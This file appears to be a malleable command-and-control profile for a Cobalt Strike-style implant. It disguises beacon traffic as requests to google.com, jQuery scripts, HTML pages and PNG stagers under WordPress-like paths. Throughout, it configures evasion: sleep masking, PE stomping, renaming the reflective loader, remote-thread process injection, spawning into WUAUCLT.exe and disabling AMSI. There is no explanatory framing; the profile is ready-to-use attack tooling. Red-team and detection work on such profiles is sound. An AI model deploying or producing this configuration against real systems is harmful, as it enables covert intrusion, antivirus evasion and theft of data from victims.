set sample_name "bcbb5cb2";
set sleeptime "63941";
set jitter "39";
set tcp_port "7339";
set useragent "Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202";

set dns_idle "7.20.177.149";
set dns_stager_subhost "ns1.";
set maxdns "255";
set dns_sleep "122";
set dns_ttl "3600";
set dns_max_txt "252";

set pipename "rpc_##";
set pipename_stager "halfduplex_##";

http-config {
	header "Server" "Pagely Gateway/1.5.1";
}

http-get "default" {

	set uri "/kj.html /nd.html /extension.html";

	client {

		header "Host" "google.com";
		header "Connection" "close";
		header "Accept" "image/jpeg";
		header "Accept-Encoding" "gzip";

		metadata {
			base64url;
			base64;
			prepend "SSID=";
			header "Cookie";
		}


	}
	server {

		header "Connection" "close";
		header "Content-Type" "text/html";
		header "Server" "golfe2";

		output {
			mask;
			base64;
			prepend "<!DOCTYPE html><html class='no-js' lang='en-US'>  <head>    <meta http-equiv='X-UA-Compatible' content='IE=EDGE' />    <meta charset='utf-8'>    <meta name='viewport' content='width=device-width, initial-scale=1' />    <meta name='apple-itunes-app' content='app-id=1089249069'>    <title>Untitled</title><meta name='description' content='";
			print;
		}

	}

}
http-post "default" {

	set uri "/html /RELEASE_NOTES";

	client {

		header "Host" "google.com";
		header "Connection" "close";
		header "Accept-Encoding" "gzip";
		header "Content-Type" "application/x-www-form-urlencoded";

		output {
			base64;
			base64;
			prepend "invoice=";
			print;
		}

		id {
			base64;
			prepend "__session__id=";
			header "Cookie";
		}

	}
	server {

		header "Status" "200";
		header "Connection" "close";
		header "Server" "Apache";

		output {
			base64;
			print;
		}

	}

}
http-stager "default" {

	set uri_x86 "/wp-includes/btn_bg.png";
	set uri_x64 "/wp-includes/lv.png";

	client {

		header "Host" "google.com";
		header "Connection" "close";

	}
	server {

		header "Content-Type" "image/png";
		header "Server" "golfe2";
		header "Connection" "close";

		output {
			print;
		}

	}

}
stage {

	set checksum "3";
	set userwx "false";
	set image_size_x86 "533335";
	set image_size_x64 "531145";
	set sleep_mask "true";
	set cleanup "true";
	set stomppe "true";
	set obfuscate "true";
	set compile_time "07 Dec 2020 01:12:48";
	set entry_point "81214";
	set name "safetydebug.dll";

	transform-x86 {
		prepend "\x90\x90\x90\x90\x90";
		strrep "ReflectiveLoader" "SafetyDebug";
	}

	transform-x64 {
		prepend "\x90\x90\x90\x90\x90";
		strrep "ReflectiveLoader" "SafetyDebug";
	}

}

process-inject {

	set allocator "VirtualAllocEx";
	set min_alloc "24684";
	set userwx "false";
	set startrwx "false";

	transform-x86 {
		prepend "\x90\x90\x90\x90\x90";
	}
	transform-x64 {
		prepend "\x90\x90\x90\x90\x90";
	}

	execute {
		CreateThread;
		RtlCreateUserThread;
		CreateRemoteThread;
	}

}

post-ex {
	set spawnto_x86 "%windir%\\syswow64\\WUAUCLT.exe";
	set spawnto_x64 "%windir%\\sysnative\\WUAUCLT.exe";
	set obfuscate "true";
	set smartinject "true";
	set amsi_disable "true";
}

http-get "variant_1" {

	set uri "/kj.js /common.js";

	client {

		header "Host" "google.com";
		header "Connection" "close";

		metadata {
			mask;
			base64;
			prepend "SSID=";
			header "Cookie";
		}

		parameter "except" "true";

	}
	server {

		header "Connection" "close";
		header "Content-Type" "application/javascript";
		header "Server" "golfe2";

		output {
			netbiosu;
			base64;
			prepend "/*! jQuery v3.4.1 | (c) JS Foundation and other contributors | jquery.org/license */!function(e,t){'use strict';'object'==typeof module&&'object'==typeof module.exports?module.exports=e.document?t(e,!0):function(e){if(!e.document)throw new Error('jQuery requires a window with a document');return t(e)}:t(e)}('undefined'!=typeof window?window:this,function(C,e){'use strict';var t=[],E=C.document,r=Object.getPrototypeOf,s=t.slice,g=t.concat,u=t.push,i=t.indexOf,n={},o=n.toString,v=n.hasOwnProperty,a=v.toString,l=a.call(Object),y={},m=function(e){return'function'==typeof e&&'number'!=typeof e.nodeType},x=function(e){return null!=e&&e===e.window},c={type:!0,src:!0,nonce:!0,noModule:!0};function b(e,t,n){var r,i,o=(n=n||E).createElement('script');if(o.text=e,t)for(r in c)(i=t[r]||t.getAttribute&&t.getAttribute(r))&&o.setAttribute(r,i);n.head.appendChild(o).parentNode;";
			print;
		}

	}

}
http-post "variant_1" {

	set uri "/remove /mobile-home";

	client {

		header "Host" "google.com";
		header "Connection" "close";
		header "Content-Type" "text/plain";

		output {
			base64url;
			base64;
			print;
		}

		id {
			base64;
			prepend "__session__id=";
			header "Cookie";
		}

	}
	server {

		header "Status" "200";
		header "Connection" "close";
		header "Server" "ESF";

		output {
			base64;
			print;
		}

	}

}
http-stager "variant_1" {

	set uri_x86 "/components/styles.png";
	set uri_x64 "/static-directory/profile.png";

	client {

		header "Host" "google.com";
		header "Connection" "close";
		header "Accept" "*/*";

	}
	server {

		header "Content-Type" "image/png";
		header "Server" "apache";
		header "Connection" "close";

		output {
			print;
		}

	}

}
